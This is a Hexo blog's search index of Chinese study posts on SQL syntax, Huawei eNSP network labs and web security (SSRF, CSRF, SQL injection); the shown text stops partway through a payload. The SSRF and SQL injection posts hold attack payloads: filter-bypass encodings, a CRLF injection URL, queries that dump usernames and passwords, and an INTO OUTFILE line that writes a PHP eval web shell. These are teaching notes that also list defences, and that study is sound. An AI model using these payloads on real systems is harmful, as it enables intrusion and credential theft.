<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>等保真题汇集</title>
      <link href="/article/b3240222.html"/>
      <url>/article/b3240222.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="05e765f9064b223b9e4a2447af7a4d0619e04350b5abc5a29a899a9894f7dca0"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL常用语法</title>
      <link href="/article/a9010216.html"/>
      <url>/article/a9010216.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database users;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> info(</span><br><span class="line">    id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">primary</span> key,</span><br><span class="line">    username <span class="type">varchar</span>(<span class="number">10</span>),</span><br><span class="line">    age <span class="type">int</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use users;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> info <span class="keyword">where</span> age<span class="operator">&gt;=</span><span class="number">18</span>;</span><br><span class="line"><span class="keyword">select</span> age <span class="keyword">from</span> info <span class="keyword">distinct</span>; <span class="comment">-- 去重</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> info <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">desc</span>; <span class="comment">-- desc降序,asc升序,默认升序</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> info (username,age) <span class="keyword">values</span> (<span class="string">&#x27;w1ndy&#x27;</span>,<span class="number">18</span>);</span><br><span class="line"><span class="keyword">update</span> info <span class="keyword">set</span> age<span class="operator">=</span><span class="number">19</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;w1ndy&#x27;</span>;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> info <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;w1ndy&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> age <span class="keyword">from</span> info <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;w%&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> age <span class="keyword">from</span> info <span class="keyword">where</span> username <span class="keyword">in</span> (<span class="string">&#x27;w1ndy&#x27;</span>,<span class="string">&#x27;w2ndy&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> info <span class="keyword">where</span> age <span class="keyword">between</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">18</span>;</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> info1</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> info2; <span class="comment">-- union自动去重,union all不去重</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">into</span> stu <span class="keyword">from</span> info; <span class="comment">-- 复制info的username列插入到stu中</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> info2 (username,age) <span class="keyword">select</span> username,age <span class="keyword">from</span> info1; <span class="comment">-- 复制info1的数据到info2</span></span><br><span class="line"><span class="keyword">create</span> index myIndex <span class="keyword">on</span> info (username,age); <span class="comment">-- 创建索引,方便快速查询，不用查询全表</span></span><br><span class="line"><span class="keyword">drop</span> index myIndex; <span class="comment">-- Oracle语法</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> info2;</span><br><span class="line"><span class="keyword">drop</span> database users;</span><br><span class="line"><span class="keyword">truncate</span> <span class="keyword">table</span> info2; <span class="comment">-- 只清空表数据，不删除表结构</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info <span class="keyword">add</span> height <span class="type">float</span>; <span class="comment">-- 添加列height</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info <span class="keyword">drop</span> <span class="keyword">column</span> height; <span class="comment">-- 删除列height</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info <span class="keyword">alter</span> <span class="keyword">column</span> height <span class="type">int</span>; <span class="comment">-- 修改列的类型</span></span><br><span class="line">id <span class="keyword">identity</span>(<span class="number">1</span>,<span class="number">1</span>) <span class="comment">-- 从1每次自增长1,sql server语法</span></span><br><span class="line">id auto_increment <span class="comment">-- 从1每次自增长1,mysql语法</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> myview <span class="keyword">as</span> <span class="keyword">select</span> username <span class="keyword">from</span> info; <span class="comment">-- 创建视图</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> myview; <span class="comment">-- 查询视图</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">view</span> myview;</span><br><span class="line">ISNULL(username,<span class="number">0</span>) <span class="comment">-- sql server中NULL判断函数，如果username为NULL则返回0,oracle中为NVL(),mysql中为IFNULL()</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>eNSP配置FireWall</title>
      <link href="/article/d892e211.html"/>
      <url>/article/d892e211.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202304261746036.png"></p><h3 id="将端口加入到安全域"><a href="#将端口加入到安全域" class="headerlink" title="将端口加入到安全域"></a>将端口加入到安全域</h3><p>分为三个安全域：DMZ、trust、untrust</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">interface g 0/0/0</span><br><span class="line">ip address 172.16.1.3 24</span><br><span class="line">service-manage ping permit</span><br><span class="line">interface g 0/0/1</span><br><span class="line">ip address 192.168.10.1 24</span><br><span class="line">service-manage ping permit</span><br><span class="line">interface g 0/0/2</span><br><span class="line">ip address 222.222.222.30 24</span><br><span class="line">service-manage ping permit</span><br><span class="line">firewall zone dmz</span><br><span class="line">add interface g 0/0/0</span><br><span class="line">quit</span><br><span class="line">firewall zone trust</span><br><span class="line">add interface g 0/0/1</span><br><span class="line">quit</span><br><span class="line">firewall zone untrust</span><br><span class="line">add interface g 0/0/2</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><h3 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>eNSP配置Switch</title>
      <link href="/article/c70deb04.html"/>
      <url>/article/c70deb04.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202304261409592.png"></p><h3 id="PC1-和-PC2-在同一个vlan"><a href="#PC1-和-PC2-在同一个vlan" class="headerlink" title="PC1 和 PC2 在同一个vlan"></a>PC1 和 PC2 在同一个vlan</h3><p>交换机配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">vlan 10 # 创建一个vlan，编号为10</span><br><span class="line">interface g 0/0/1</span><br><span class="line">port link-type access   # 0/0/1端口设置为access口</span><br><span class="line">port default vlan 10    # 将0/0/1端口加入到vlan 10中</span><br><span class="line">interface g 0/0/2</span><br><span class="line">port link-type access</span><br><span class="line">port default vlan 10</span><br></pre></td></tr></table></figure><p>连通性测试<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202304261415322.png"><br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202304261416797.png"></p><h3 id="PC1-和-PC2-不在同一个vlan"><a href="#PC1-和-PC2-不在同一个vlan" class="headerlink" title="PC1 和 PC2 不在同一个vlan"></a>PC1 和 PC2 不在同一个vlan</h3><p>交换机配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">vlan 10 # 划分一个vlan，编号为10</span><br><span class="line">interface g 0/0/1</span><br><span class="line">port link-type access   # 0/0/1端口设置为access口</span><br><span class="line">port default vlan 10    # 将0/0/1端口划分到vlan 10中</span><br><span class="line">vlan 20</span><br><span class="line">interface g 0/0/2</span><br><span class="line">port link-type access</span><br><span class="line">port default vlan 20</span><br></pre></td></tr></table></figure><p>连通性测试<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202304261418979.png"><br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202304261419774.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>eNSP配置Router</title>
      <link href="/article/ed365239.html"/>
      <url>/article/ed365239.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202304221126094.png"><br>路由器AR1配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sys                                       进入系统视图</span><br><span class="line">sysname AR1                               设置设备主机名</span><br><span class="line">interface g 0/0/0                         配置AR1的0/0/0端口</span><br><span class="line">ip address 192.168.1.1 24                 配置0/0/0端口IP</span><br><span class="line">interface g 0/0/1                         配置AR1的0/0/1端口</span><br><span class="line">ip address 10.10.1.1 24                   配置0/0/1端口IP</span><br><span class="line">ip route-static 192.168.2.0 24 10.10.1.2  设置静态路由(目标网络 下一跳)</span><br></pre></td></tr></table></figure><p>路由器AR2配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">sysname AR2</span><br><span class="line">interface g 0/0/0</span><br><span class="line">ip address 10.10.1.2 24</span><br><span class="line">interface g 0/0/1</span><br><span class="line">ip address 20.20.1.1 24</span><br><span class="line">ip route-static 192.168.2.0 24 20.20.1.2  从192.168.1.0 -&gt; 192.168.2.0</span><br><span class="line">ip route-static 192.168.1.0 24 10.10.1.1  从192.168.2.0 -&gt; 192.168.1.0</span><br></pre></td></tr></table></figure><p>路由器AR3配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">sysname AR3</span><br><span class="line">interface g 0/0/0</span><br><span class="line">ip address 20.20.1.2 24</span><br><span class="line">interface g 0/0/1</span><br><span class="line">ip address 192.168.2.1 24</span><br><span class="line">ip route-static 192.168.1.0 24 20.20.1.1</span><br></pre></td></tr></table></figure><p>连通性测试<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202304221208758.png"><br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202304221209145.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/article/813434ca.html"/>
      <url>/article/813434ca.html</url>
      
        <content type="html"><![CDATA[<p>SSRF(服务端请求伪造)，攻击者将恶意请求发给服务器，服务器执行该请求获取内网资源。SSRF通常用于外部网络无法直接访问的内部资源。<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303231939285.jpg"></p><h3 id="0x00-PHP中SSRF危险函数与协议"><a href="#0x00-PHP中SSRF危险函数与协议" class="headerlink" title="0x00 PHP中SSRF危险函数与协议"></a>0x00 PHP中SSRF危险函数与协议</h3><ul><li>file_get_contents()</li><li>fsockopen()</li><li>curl_exec()</li><li>file:&#x2F;&#x2F;   读取文件，如 file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</li><li>dict:&#x2F;&#x2F;   访问资源，如 dict:&#x2F;&#x2F;&#x2F;192.168.0.1:6739&#x2F;info</li><li>gopher:&#x2F;&#x2F; 分布式文档传递服务，可用<a href="https://github.com/tarunkant/Gopherus">gopherus</a>生成payload</li></ul><h3 id="0x01-利用方式"><a href="#0x01-利用方式" class="headerlink" title="0x01 利用方式"></a>0x01 利用方式</h3><ul><li>内网端口扫描</li><li>内网应用及服务漏洞扫描</li><li>若PHP安装了expect扩展，可利用expect协议命令执行</li><li>DOS攻击</li><li>file协议暴力枚举敏感文件</li></ul><h3 id="0x01-防御手段"><a href="#0x01-防御手段" class="headerlink" title="0x01 防御手段"></a>0x01 防御手段</h3><ul><li>过滤返回的信息</li><li>同意报错信息</li><li>限制请求端口</li><li>限制访问IP</li><li>禁用不常用协议</li></ul><h3 id="IP过滤绕过"><a href="#IP过滤绕过" class="headerlink" title="IP过滤绕过"></a>IP过滤绕过</h3><h4 id="IP改写-192-168-0-1"><a href="#IP改写-192-168-0-1" class="headerlink" title="IP改写(192.168.0.1)"></a>IP改写(192.168.0.1)</h4><ul><li>8进制：0300.0250.0.1</li><li>16进制：0xc0.0xa8.0.1</li><li>10进制整数格式：3232235521</li><li>16进制整数格式：0xc0a80001</li><li>合并后两位：1.1.278 &#x2F; 1.1.755</li><li>合并后三位：1.278 &#x2F; 1.755 &#x2F; 3.14159267</li></ul><h4 id="CRLF编码-HTTP头部注入"><a href="#CRLF编码-HTTP头部注入" class="headerlink" title="CRLF编码(HTTP头部注入)"></a>CRLF编码(HTTP头部注入)</h4><p>通过添加回车换行绕过过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%0d --&gt; 0x0d --&gt; \r 回车</span><br><span class="line">%0a --&gt; 0x0a --&gt; \n 换行</span><br><span class="line">https://www.example.com?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSRF</title>
      <link href="/article/d12d6355.html"/>
      <url>/article/d12d6355.html</url>
      
        <content type="html"><![CDATA[<p>CSRF(跨站请求伪造)，攻击者盗用他人身份，以他人名义发送恶意请求。<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303231725022.jpg"></p><h3 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h3><ul><li>用户登录了网站A</li><li>用户触发了攻击者构造的恶意请求</li></ul><h3 id="0x01-防御手段"><a href="#0x01-防御手段" class="headerlink" title="0x01 防御手段"></a>0x01 防御手段</h3><ul><li>重要请求操作设置二次认证</li><li>设置合适的会话超时时间</li><li>重要请求操作尽量使用POST</li><li>CSRF-Token</li><li>SOP(同源策略)，检查HTTP请求头中Referer字段是否合法</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL-Injection</title>
      <link href="/article/2030ee36.html"/>
      <url>/article/2030ee36.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-联合查询注入"><a href="#0x00-联合查询注入" class="headerlink" title="0x00 联合查询注入"></a>0x00 联合查询注入</h3><p>利用前提：页面中有显示位</p><h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><p>在可能的变量注入点后面添加payload: and 1&#x3D;1 &#x2F; and 1&#x3D;2 回显页面不同（整型判断）<br>单引号判断(‘)显示数据库错误信息或者页面回显不同（整形、字符串类型判断）<br>(\) 转义符<br>-1&#x2F;+1 回显下一个或上一个页面（整型判断）<br>注：加号’+’在URL中有特殊含义，因此在需要对其URL编码为%2b</p><h4 id="判断是整形还是字符型"><a href="#判断是整形还是字符型" class="headerlink" title="判断是整形还是字符型"></a>判断是整形还是字符型</h4><p>分别测试 and 1&#x3D;1 和 and 1&#x3D;2<br>页面没有变化，则判断不是整型注入；页面发生变化，则判断为字符注入</p><table><thead><tr><th align="center">$id</th><th align="center">数字型(id&#x3D;$id)</th><th align="center">字符型(id&#x3D;’$id’)</th></tr></thead><tbody><tr><td align="center">1 and 1&#x3D;1</td><td align="center">id&#x3D;1 and 1&#x3D;1 返回正常</td><td align="center">id&#x3D;’1 and 1&#x3D;1’ 返回正常</td></tr><tr><td align="center">1 and 1&#x3D;2</td><td align="center">id&#x3D;1 and 1&#x3D;2 返回错误</td><td align="center">id&#x3D;’1 and 1&#x3D;2’ 返回正常</td></tr><tr><td align="center">1 or 1&#x3D;1</td><td align="center">id&#x3D;1 or 1&#x3D;1 返回正常</td><td align="center">id&#x3D;’1 or 1&#x3D;1’ 返回正常</td></tr><tr><td align="center">1 or 1&#x3D;2</td><td align="center">id&#x3D;1 or 1&#x3D;2返回正常</td><td align="center">id&#x3D;’1 or 1&#x3D;2’ 返回正常</td></tr><tr><td align="center">1’</td><td align="center">id&#x3D;1’ 返回错误</td><td align="center">id&#x3D;’1’’ 返回错误</td></tr><tr><td align="center">1’ –+</td><td align="center">id&#x3D;1’ –+ 返回错误</td><td align="center">id&#x3D;’1’ –+’ 返回正常</td></tr></tbody></table><h4 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h4><p>通过 id&#x3D;1 order by 10#使用二分法猜解列数</p><h4 id="判断显示位"><a href="#判断显示位" class="headerlink" title="判断显示位"></a>判断显示位</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure><h4 id="获取所有数据库名"><a href="#获取所有数据库名" class="headerlink" title="获取所有数据库名"></a>获取所有数据库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(SCHEMA_NAME) <span class="keyword">from</span> information_schema.SCHEMATA)#</span><br></pre></td></tr></table></figure><h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;database&#x27;</span>)#</span><br></pre></td></tr></table></figure><h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(COLUMN_NAME) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;dbName&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;tableName&#x27;</span>)#</span><br></pre></td></tr></table></figure><h4 id="获取列中信息"><a href="#获取列中信息" class="headerlink" title="获取列中信息"></a>获取列中信息</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(username,<span class="string">&#x27;-&#x27;</span>,password) <span class="keyword">from</span> tableName)#</span><br></pre></td></tr></table></figure><h4 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h4><ol><li>查看mysql读写文件的设置<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;secure%&#x27;</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">secure_file_priv取值</th><th align="center">读写状态</th></tr></thead><tbody><tr><td align="center">NULL</td><td align="center">禁止读写</td></tr><tr><td align="center">空</td><td align="center">允许读写</td></tr><tr><td align="center">路径</td><td align="center">只能在该路径下读写</td></tr></tbody></table></li><li>读写文件的前提：</li></ol><ul><li>secure_file_priv 为空</li><li>知道文件的绝对路径</li><li>web目录有读写权限</li></ul><ol start="3"><li>在配置文件 mysql&#x2F;bin&#x2F;my.ini 中可通过添加<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv=</span><br></pre></td></tr></table></figure>来置空以实现任意位置读写</li><li>读取静态文件<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="string">&#x27;C:/a/b/c.txt&#x27;</span>)#</span><br></pre></td></tr></table></figure></li><li>读取PHP文件<br>php环境下直接读取php文件，文件会被解析而无法打印出来，所以需要将文件内容编码<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,hex(load_file(<span class="string">&#x27;path&#x27;</span>))#</span><br></pre></td></tr></table></figure></li><li>写入文件<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">into</span> outfile <span class="string">&#x27;C:/a/b/c.txt&#x27;</span>;</span><br><span class="line">或者</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;&lt;?php eval($_POST[123]); ?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:/a/b/c.php&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="0x01-报错型注入"><a href="#0x01-报错型注入" class="headerlink" title="0x01 报错型注入"></a>0x01 报错型注入</h3><p>适用于无回显但有错误信息输出的情况</p><h4 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h4><ol><li>extractvalue()<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="string">&#x27; and (extractvalue(&#x27;</span>anything<span class="string">&#x27;,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select version())))) --+</span></span><br></pre></td></tr></table></figure></li><li>updatexml()<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="string">&#x27; and (updatexml(&#x27;</span>anything<span class="string">&#x27;,(select database()),&#x27;</span>anything<span class="string">&#x27;)) --+</span></span><br></pre></td></tr></table></figure></li><li>floor()</li></ol><ul><li>rand() : 产生一个伪随机序列</li><li>count() : 返回指定列的数目</li><li>group by : 结合计数函数，根据列对结果进行分组<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> concat(database(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))</span><br></pre></td></tr></table></figure></li></ul><h3 id="0x02-布尔盲注"><a href="#0x02-布尔盲注" class="headerlink" title="0x02 布尔盲注"></a>0x02 布尔盲注</h3><p>无错误回显，返回true或false</p><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><table><thead><tr><th align="center">函数</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">length()</td><td align="center">返回长度</td></tr><tr><td align="center">substr(str,pos,len)</td><td align="center">字符串截取</td></tr><tr><td align="center">mid(str,pos,len)</td><td align="center">字符串截取</td></tr><tr><td align="center">ascii()</td><td align="center">返回字符ASCII码</td></tr><tr><td align="center">ord()</td><td align="center">返回A字符SCII码</td></tr><tr><td align="center">if(a,b,c)</td><td align="center">a为条件，为真返回b，为假返回c</td></tr></tbody></table><h4 id="猜解库名"><a href="#猜解库名" class="headerlink" title="猜解库名"></a>猜解库名</h4><ol><li>猜解数据库名长度<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure></li><li>猜解数据库名<br>二分法逐个字符猜解<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">97</span>#</span><br></pre></td></tr></table></figure></li></ol><h4 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h4><ol><li>猜解表的数量<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure></li><li>猜解表名长度<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span><span class="number">9</span># 猜解第一个表的表长</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span><span class="number">9</span># 猜解第二个表的表长</span><br></pre></td></tr></table></figure></li><li>猜解表名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span 